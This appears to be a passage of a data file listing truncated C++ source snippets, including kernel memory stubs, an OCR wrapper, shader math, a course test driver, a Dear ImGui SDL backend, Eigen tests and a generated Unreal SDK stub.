std::string::npos || lastDot == std::string::npos || lastDot <= lastSlash)\n\t\treturn path;\n\n\tstd::string directory = path.substr(0, lastSlash + 1);\n\tstd::string filename = path.substr(lastSlash + 1, lastDot - lastSlash - 1);\n\tstd::string extension = path.substr(lastDot);\n\n\tstd::random_device rd;\n\tstd::mt19937 g(rd());\n\tstd::shuffle(filename.begin(), filename.end(), g);\n\n\treturn directory + filename + extension;\n}",
    "#include <lib/print.h>\n#include <stddef.h>\n#include <stdint.h>\n\n// GCC and clang reserve the right to generate calls to these functions\n// even if they are not explicitly used in the code.\n\nextern \"C\" void* memcpy(void* dest, const void* src, size_t count) {\n  char* dest8 = (char*)dest;\n  const char* src8 = (const char*)src;\n\n  while (count--) {\n    *dest8++ = *src8++;\n  }\n\n  return dest;\n}\n\nextern \"C\" void* memset(void* dest, int value, size_t count) {\n  unsigned char* dest8 = (unsigned char*)dest;\n  unsigned char val8 = (unsigned char)value;\n\n  while (count--) {\n    *dest8++ = val8;\n  }\n\n  return dest;\n}\n\nextern \"C\" void* memmove(void* dest, const void* src, size_t count) {\n  char* dest8 = (char*)dest;\n  const char* src8 = (const char*)src;\n\n  if (src8 > dest8) {\n    while (count--) {\n      *dest8++ = *src8++;\n    }\n  } else {\n    dest8 += count;\n    src8 += count;\n\n    while (count--) {\n      *--dest8 = *--src8;\n    }\n  }\n\n  return dest;\n}\n\nextern \"C\" int memcmp(const void* ptr1, const void* ptr2, size_t count) {\n  const unsigned char* p1 = (const unsigned char*)ptr1;\n  const unsigned char* p2 = (const unsigned char*)ptr2;\n\n  while (count--) {\n    if (*p1 != *p2)\n      return *p1 < *p2 ? -1 : 1;\n\n    p1++;\n    p2++;\n  }\n\n  return 0;\n}\n\n// These following two stubs are required by the Itanium C++ ABI\n\nextern \"C\" int __cxa_atexit(void (*)(void*), void*, void*) {\n  // @note: This really shouldn't be called given that we compile\n  // with -fno-use-cxa-atexit\n  kpanic(\"Attempt to call __cxa_atexit\\n\");\n}\n\nextern \"C\" void __cxa_pure_virtual() {\n  kpanic(\"Pure virtual function called\\n\");\n}\n",
    "// Copyright (c) 2021 PaddlePaddle Authors. All Rights Reserved.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"native-ocr.h\"\n#include <algorithm>\n#include <filesystem>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <map>\n#include <numeric>\n#include <sstream>\n#include <stdexcept>\n#include \"timer.h\"\n\nnamespace fs = std::filesystem;\n\nstd::vector<std::string> read_dictionary(std::string path);\ncv::Mat get_rotate_crop_image(cv::Mat source_image, std::vector<std::vector<int>> box);\nvoid visualization(cv::Mat source_image, std::vector<std::vector<std::vector<int>>> boxes,\n                   std::string output_image_path);\n\nNativeOcr::NativeOcr(std::unordered_map<std::string, std::any> rawOptions, const std::string &assetDir,\n                     const std::string &debugOutputDir)\n    : m_options {convertRawOptions(rawOptions, assetDir, debugOutputDir)} {\n  m_classifier_predictor.reset(new ClassifierPredictor(m_options));\n  m_detection_predictor.reset(new DetectionPredictor(m_options));\n  m_recognition_predictor.reset(new RecognitionPredictor(m_options));\n  m_dictionary = read_dictionary(m_options.models.dictionary_path);\n  m_dictionary.insert(m_dictionary.begin(), \"#\");\n  m_dictionary.push_back(\" \");\n}\n\nstd::vector<std::string> NativeOcr::detect(std::string &image_path) {\n  Timer timer;\n  timer.start();\n\n  if (!fs::exists(image_path)) {\n    throw std::runtime_error(\"Image file does not exist - '\" + image_path + \"'\");\n  }\n\n  if (m_options.is_debug) {\n    std::cout << \"[DEBUG] Start detection\" << std::endl;\n  }\n  auto image = cv::imread(image_path);\n\n  auto detection_result = m_detection_predictor->predict(image);\n\n  if (m_options.is_debug) {\n    auto output_path = m_options.debug_output_dir + \"/boxes.jpg\";\n    visualization(image, detection_result.data, output_path);\n    std::cout << \"[DEBUG] Detection visualized image saved in \" << output_path << std::endl;\n  }\n\n  if (m_options.is_debug) {\n    std::cout << \"[DEBUG] Start recognition\" << std::endl;\n  }\n\n  cv::Mat image_copy;\n  image.copyTo(image_copy);\n\n  std::vector<std::string> recognition_text;\n  std::vector<float> recognition_text_score;\n  std::vector<ClassifierResult> classifier_results;\n  std::vector<RecognitionResult> recognition_results;\n  for (int i = detection_result.data.size() - 1; i >= 0; i--) {\n    auto crop_image = get_rotate_crop_image(image_copy, detection_result.data[i]);\n\n    if (m_options.is_debug) {\n      auto output_path =\n          m_options.debug_output_dir + \"/line-\" + std::to_string(detection_result.data.size() - 1 - i) + \".jpg\";\n      cv::imwrite(output_path, crop_image);\n    }\n\n    if (m_options.use_direction_classify) {\n      auto threshold = 0.9;\n      auto classifier_result = m_classifier_predictor->predict(crop_image, threshold);\n      classifier_results.push_back(classifier_result);\n      crop_image = classifier_result.data;\n      if (m_options.is_debug) {\n        auto output_path = m_options.debug_output_dir + \"/line-\" +\n                           std::to_string(detection_result.data.size() - 1 - i) + \"-direction.jpg\";\n        cv::imwrite(output_path, crop_image);\n      }\n    }\n\n    cv::Mat resized_image;\n    auto recognition_result = m_recognition_predictor->predict(crop_image, m_dictionary, resized_image);\n    recognition_results.push_back(recognition_result);\n    recognition_text.push_back(recognition_result.data.first);\n    recognition_text_score.push_back(recognition_result.data.second);\n\n    // if (m_options.is_debug) {\n    //   auto output_path =\n    //       m_options.debug_output_dir + \"/line-\" + std::to_string(detection_result.data.size() - 1 - i) +\n    //       \"-resized.jpg\";\n    //   cv::imwrite(output_path, resized_image);\n    // }\n  }\n\n  timer.end();\n  auto total_time = timer.get_average_ms();\n  if (m_options.is_debug) {\n    float classifier_total_sum = std::accumulate(\n        classifier_results.begin(), classifier_results.end(), 0.0f,\n        [](float accumulator, const ClassifierResult &result) { return accumulator + result.performance.total_time; });\n    float classifier_preprocess_sum = std::accumulate(classifier_results.begin(), classifier_results.end(), 0.0f,\n                                                      [](float accumulator, const ClassifierResult &result) {\n                                                        return accumulator + result.performance.preprocess_time;\n                                                      });\n    float classifier_predict_sum = std::acc",
    "// Copyright 2024 by Owen Bulka.\n// All rights reserved.\n// This file is released under the \"MIT License Agreement\".\n// Please see the LICENSE.md file that should have been included as part\n// of this package.\n\n\n//\n// Math operations\n//\n\n\n/**\n * Compute the fractional portion of the value. Ex. 3.5 returns 0.5\n *\n * @arg value: The value to get the fractional portion of.\n *\n * @returns: The fractional portion of the value.\n */\ninline float fract(const float value)\n{\n    return value - floor(value);\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline void matmul(const float4x4 &m, const float4 &v, float4 &out)\n{\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float4 matmul(const float4x4 &m, const float4 &v)\n{\n    float4 out;\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n\n    return out;\n}\n\n\n/**\n * Multiply a 3d vector by a 3x3 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float3 matmul(const float3x3 &m, const float3 &v)\n{\n    return float3(\n        m[0][0] * v.x + m[0][1] * v.y + m[0][2] * v.z,\n        m[1][0] * v.x + m[1][1] * v.y + m[1][2] * v.z,\n        m[2][0] * v.x + m[2][1] * v.y + m[2][2] * v.z\n    );\n}\n\n\n/**\n * Convert the uv position in a latlong image to angles.\n *\n * @arg uvPosition: The UV position.\n *\n * @returns: The equivalent angles in radians.\n */\ninline float2 uvPositionToAngles(const float2 &uvPosition)\n{\n    return float2(\n        (uvPosition.x + 1.0f) * PI,\n        (1.0f - uvPosition.y) * PI / 2.0f\n    );\n}\n\n\n/**\n * Convert location of a pixel in an image into UV.\n *\n * @arg pixelLocation: The x, and y positions of the pixel.\n * @arg format: The image width, and height.\n *\n * @returns: The UV position.\n */\ninline float2 pixelsToUV(const float2 &pixelLocation, const float2 &format)\n{\n    return float2(\n        2.0f * pixelLocation.x / format.x - 1.0f,\n        2.0f * pixelLocation.y / format.y - 1.0f\n    );\n}\n\n\n/**\n * Convert a spherical unit vector (unit radius) to cartesion.\n *\n * @arg angles: The spherical angles in radians.\n *\n * @returns: The equivalent cartesion vector.\n */\ninline float3 sphericalUnitVectorToCartesion(const float2 &angles)\n{\n    const float sinPhi = sin(angles.y);\n    return float3(\n        cos(angles.x) * sinPhi,\n        cos(angles.y),\n        sin(angles.x) * sinPhi\n    );\n}\n\n\n/**\n * Get the position component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg position: The location to store the position.\n */\ninline void positionFromWorldMatrix(const float4x4 &worldMatrix, float3 &position)\n{\n    position = float3(\n        worldMatrix[0][3],\n        worldMatrix[1][3],\n        worldMatrix[2][3]\n    );\n}\n\n\n/**\n * Get the rotation component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg rotation: The location to store the rotation.\n */\ninline void rotationFromWorldMatrix(const float4x4 &worldMatrix, float3x3 &rotationMatrix)\n{\n    rotationMatrix[0][0] = worldMatrix[0][0];\n    rotationMatrix[0][1] = worldMatrix[0][1];\n    rotationMatrix[0][2] = worldMatrix[0][2];\n    rotationMatrix[1][0] = worldMatrix[1][0];\n    rotationMatrix[1][1] = worldMatrix[1][1];\n    rotationMatrix[1][2] = worldMatrix[1][2];\n    rotationMatrix[2][0] = worldMatrix[2][0];\n    rotationMatrix[2][1] = worldMatrix[2][1];\n    rotationMatrix[2][2] = worldMatrix[2][2];\n}\n\n\n//\n// Randomization functions\n//\n\n\n// Some random constants on the interval [1, 2]\n#define RAND_CONST_0 1.571411510193971f\n#define RAND_CONST_1 1.268632820084931f\n#define RAND_CONST_2 1.7880365647937733f\n#define RAND_CONST_3 1.3546987471558234f\n#define RAND_CONST_4 1.4365958250848703f\n#define RAND_CONST_5 1.7045380669435368f\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float random(const float seed)\n{\n    return fract(sin(73.1f * seed + 91.3458f) * 47453.5453f);\n}\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float2 random(const float2 &seed)\n{\n    return float2(\n        fract(sin(13.157f * seed.x + 71.743f) * 7513.471f),\n        fract(sin(97.519f * seed.y + 113.591f) * 47453.5453f)\n    );\n}\n\n\n/**\n * Create a random point that lies within the unit circle.\n *\n * @arg seed: The random seed.\n *\n *",
    "#include <iostream>\n#include <iomanip>\n#include <utility>\n#include <string>\n#include \"ProteinDatabase.h\"\n#include \"ProteinDatabase.h\" // intentional\n#include \"TimedTask.h\"\n#include \"TimedTask.h\" // intentional\n\nint cout = 0; // won't compile if headers don't follow convention regarding namespaces\n\nint main(int argc, char** argv)\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\tfor (int i = 0; i < argc; ++i)\n\t\tstd::cout << std::setw(3) << i + 1 << \": \" << argv[i] << '\\n';\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\tif (argc == 1)\n\t{\n\t\tstd::cerr << \"ERROR: Missing file name!\\n\";\n\t\treturn 1;\n\t}\n\telse if (argc != 2)\n\t{\n\t\tstd::cerr << \"ERROR: Too many arguments!\\n\";\n\t\treturn 2;\n\t}\n\n\tseneca::TimedTask t;\n\t{\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBA;\n\t\tt.stopClock();\n\t\tt.addTask(\"  0-arg Constructor\");\n\t\tstd::cout << \"  0-arg Constructor - protein_DBA.size = \"\n\t\t\t<< std::setw(7) << protein_DBA.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[  0] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[ 99] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  last: [\" << protein_DBA[protein_DBA.size() - 1] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String last+: [\" << protein_DBA[protein_DBA.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBB(argv[1]);\n\t\tt.stopClock();\n\t\tt.addTask(\"  1-arg Constructor\");\n\t\tauto cnt = protein_DBB.size();\n\t\tstd::cout << \"  1-arg Constructor - protein_DBB.size = \"\n\t\t          << std::setw(7) << cnt << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String     1: [\"\n\t\t          << protein_DBB[  0].size()                               << \"][\"\n\t\t          << protein_DBB[  0].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[  0].substr(protein_DBB[  0].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String   100: [\"\n\t\t          << protein_DBB[ 99].size()                               << \"][\"\n\t\t          << protein_DBB[ 99].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[ 99].substr(protein_DBB[ 99].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String  1000: [\"\n\t\t          << protein_DBB[999].size()                               << \"][\"\n\t\t          << protein_DBB[999].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[999].substr(protein_DBB[999].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String  last: [\"\n\t\t          << protein_DBB[cnt - 1].size()                           << \"][\"\n\t\t          << protein_DBB[cnt - 1].substr(0, 20)                    << \"][\"\n\t\t          << protein_DBB[cnt - 1].substr(protein_DBB[cnt - 1].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String last+: [\" << protein_DBB[protein_DBB.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBC{ protein_DBB };\n\t\tt.stopClock();\n\t\tt.addTask(\"  Copy Constructor\");\n\t\tstd::cout << \"  Copy Constructor  - protein_DBC.size = \"\n\t\t\t<< std::setw(7) << protein_DBC.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String     1: [\" << protein_DBC[0].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String   100: [\" << protein_DBC[99].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String  1000: [\" << protein_DBC[999].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String  last: [\" << protein_DBC[protein_DBC.size() - 1].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String last+: [\" << protein_DBC[protein_DBC.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tprotein_DBA = protein_DBB;\n\t\tt.stopClock();\n\t\tt.addTask(\"  Copy Assignment\");\n\t\tstd::cout << \"  Copy Assignment   - protein_DBA.size = \"\n\t\t\t<< std::setw(7) << protein_DBA.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[0].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[99].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  last: [\" << protein_DBA[protein_DBA.size() - 1].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String last+: [\" << protein_DBA[protein_DBA.size()] << \"]\\n\\n\";\n\t\t\n\t\t\n\t\tprotein_DBA = protein_DBA;\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBD = std::move(protein_DBA);\n\t\tt.stopClock();\n\t\tt.addTask(\"  Move Constructor\");\n\t\tstd::cout << \"  Move Constructor  - protein_DBD.size = \"\n\t\t\t<< std::setw(7) << protein_DBD.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[0] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[99] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999] << \"]\\n\";\n\t\tstd::cout",
    "// dear imgui: Renderer Backend for SDL_Renderer for SDL2\n// (Requires: SDL 2.0.17+)\n\n// Note how SDL_Renderer is an _optional_ component of SDL2.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer currently offers a limited graphic API to the end-user and\n// it might be difficult to step out of those boundaries.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n//  2023-05-30: Renamed imgui_impl_sdlrenderer.h/.cpp to imgui_impl_sdlrenderer2.h/.cpp to accommodate for upcoming SDL3.\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-12-21: Update SDL_RenderGeometryRaw() format to work with SDL 2.0.19.\n//  2021-12-03: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2021-10-06: Backup and restore modified ClipRect/Viewport.\n//  2021-09-21: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdlrenderer2.h\"\n#include <stdint.h>     // intptr_t\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\n// SDL\n#include <SDL.h>\n#if !SDL_VERSION_ATLEAST(2,0,17)\n#error This backend requires SDL 2.0.17+ because of SDL_RenderGeometry() function\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer2_Data\n{\n    SDL_Renderer*   SDLRenderer;\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer2_Data() { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer2_Data* ImGui_ImplSDLRenderer2_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer2_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer2_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer2_Data* bd = IM_NEW(ImGui_ImplSDLRenderer2_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer2\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->SDLRenderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer2_Shutdown()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer2_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    io.BackendFlags &= ~ImGuiBackendFlags_RendererHasVtxOffset;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer2_SetupRenderState()\n{\n\tImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_RenderSetViewport(bd->SDLRenderer, nullptr);\n\tSDL_RenderSetClipRect(bd->SDLRenderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer2_NewFrame()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Context or backend not initialized! Did you call ImGui_ImplSDLRenderer2_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer2_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer2_RenderDrawData(ImDrawData* draw_data)\n{\n\tImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n\n\t// If there's a scale factor set by the user, use that instead\n    ",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2014 Benoit Steiner <benoit.steiner.goog@gmail.com>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#include \"main.h\"\n\n#include <Eigen/CXX11/Tensor>\n\nusing Eigen::Tensor;\nusing Eigen::TensorMap;\n\nstatic void test_assign() {\n  std::string data1[6];\n  TensorMap<Tensor<std::string, 2>> mat1(data1, 2, 3);\n  std::string data2[6];\n  const TensorMap<Tensor<const std::string, 2>> mat2(data2, 2, 3);\n\n  for (int i = 0; i < 6; ++i) {\n    std::ostringstream s1;\n    s1 << \"abc\" << i * 3;\n    data1[i] = s1.str();\n    std::ostringstream s2;\n    s2 << \"def\" << i * 5;\n    data2[i] = s2.str();\n  }\n\n  Tensor<std::string, 2> rslt1;\n  rslt1 = mat1;\n  Tensor<std::string, 2> rslt2;\n  rslt2 = mat2;\n\n  Tensor<std::string, 2> rslt3 = mat1;\n  Tensor<std::string, 2> rslt4 = mat2;\n\n  Tensor<std::string, 2> rslt5(mat1);\n  Tensor<std::string, 2> rslt6(mat2);\n\n  for (int i = 0; i < 2; ++i) {\n    for (int j = 0; j < 3; ++j) {\n      VERIFY_IS_EQUAL(rslt1(i, j), data1[i + 2 * j]);\n      VERIFY_IS_EQUAL(rslt2(i, j), data2[i + 2 * j]);\n      VERIFY_IS_EQUAL(rslt3(i, j), data1[i + 2 * j]);\n      VERIFY_IS_EQUAL(rslt4(i, j), data2[i + 2 * j]);\n      VERIFY_IS_EQUAL(rslt5(i, j), data1[i + 2 * j]);\n      VERIFY_IS_EQUAL(rslt6(i, j), data2[i + 2 * j]);\n    }\n  }\n}\n\nstatic void test_concat() {\n  Tensor<std::string, 2> t1(2, 3);\n  Tensor<std::string, 2> t2(2, 3);\n\n  for (int i = 0; i < 2; ++i) {\n    for (int j = 0; j < 3; ++j) {\n      std::ostringstream s1;\n      s1 << \"abc\" << i + j * 2;\n      t1(i, j) = s1.str();\n      std::ostringstream s2;\n      s2 << \"def\" << i * 5 + j * 32;\n      t2(i, j) = s2.str();\n    }\n  }\n\n  Tensor<std::string, 2> result = t1.concatenate(t2, 1);\n  VERIFY_IS_EQUAL(result.dimension(0), 2);\n  VERIFY_IS_EQUAL(result.dimension(1), 6);\n\n  for (int i = 0; i < 2; ++i) {\n    for (int j = 0; j < 3; ++j) {\n      VERIFY_IS_EQUAL(result(i, j), t1(i, j));\n      VERIFY_IS_EQUAL(result(i, j + 3), t2(i, j));\n    }\n  }\n}\n\nstatic void test_slices() {\n  Tensor<std::string, 2> data(2, 6);\n  for (int i = 0; i < 2; ++i) {\n    for (int j = 0; j < 3; ++j) {\n      std::ostringstream s1;\n      s1 << \"abc\" << i + j * 2;\n      data(i, j) = s1.str();\n    }\n  }\n\n  const Eigen::DSizes<ptrdiff_t, 2> half_size(2, 3);\n  const Eigen::DSizes<ptrdiff_t, 2> first_half(0, 0);\n  const Eigen::DSizes<ptrdiff_t, 2> second_half(0, 3);\n\n  Tensor<std::string, 2> t1 = data.slice(first_half, half_size);\n  Tensor<std::string, 2> t2 = data.slice(second_half, half_size);\n\n  for (int i = 0; i < 2; ++i) {\n    for (int j = 0; j < 3; ++j) {\n      VERIFY_IS_EQUAL(data(i, j), t1(i, j));\n      VERIFY_IS_EQUAL(data(i, j + 3), t2(i, j));\n    }\n  }\n}\n\nstatic void test_additions() {\n  Tensor<std::string, 1> data1(3);\n  Tensor<std::string, 1> data2(3);\n  for (int i = 0; i < 3; ++i) {\n    data1(i) = \"abc\";\n    std::ostringstream s1;\n    s1 << i;\n    data2(i) = s1.str();\n  }\n\n  Tensor<std::string, 1> sum = data1 + data2;\n  for (int i = 0; i < 3; ++i) {\n    std::ostringstream concat;\n    concat << \"abc\" << i;\n    std::string expected = concat.str();\n    VERIFY_IS_EQUAL(sum(i), expected);\n  }\n}\n\nstatic void test_initialization() {\n  Tensor<std::string, 2> a(2, 3);\n  a.setConstant(std::string(\"foo\"));\n  for (int i = 0; i < 2 * 3; ++i) {\n    VERIFY_IS_EQUAL(a(i), std::string(\"foo\"));\n  }\n}\n\nEIGEN_DECLARE_TEST(cxx11_tensor_of_strings) {\n  // Beware: none of this is likely to ever work on a GPU.\n  CALL_SUBTEST(test_assign());\n  CALL_SUBTEST(test_concat());\n  CALL_SUBTEST(test_slices());\n  CALL_SUBTEST(test_additions());\n  CALL_SUBTEST(test_initialization());\n}\n",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass GCNL_Uncle_Dash_Charging.GCNL_Uncle_Dash_Charging_C\n// (Actor)\n\nclass UClass* AGCNL_Uncle_Dash_Charging_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"GCNL_Uncle_Dash_Charging_C\");\n\n\treturn Clss;\n}\n\n\n// GCNL_Uncle_Dash_Charging_C GCNL_Uncle_Dash_Charging.Default__GCNL_Uncle_Dash_Charging_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass AGCNL_Uncle_Dash_Charging_C* AGCNL_Uncle_Dash_Charging_C::GetDefaultObj()\n{\n\tstatic class AGCNL_Uncle_Dash_Charging_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<AGCNL_Uncle_Dash_Charging_C*>(AGCNL_Uncle_Dash_Charging_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function GCNL_Uncle_Dash_Charging.GCNL_Uncle_Dash_Charging_C.OnLoopingStart\n// (Event, Public, 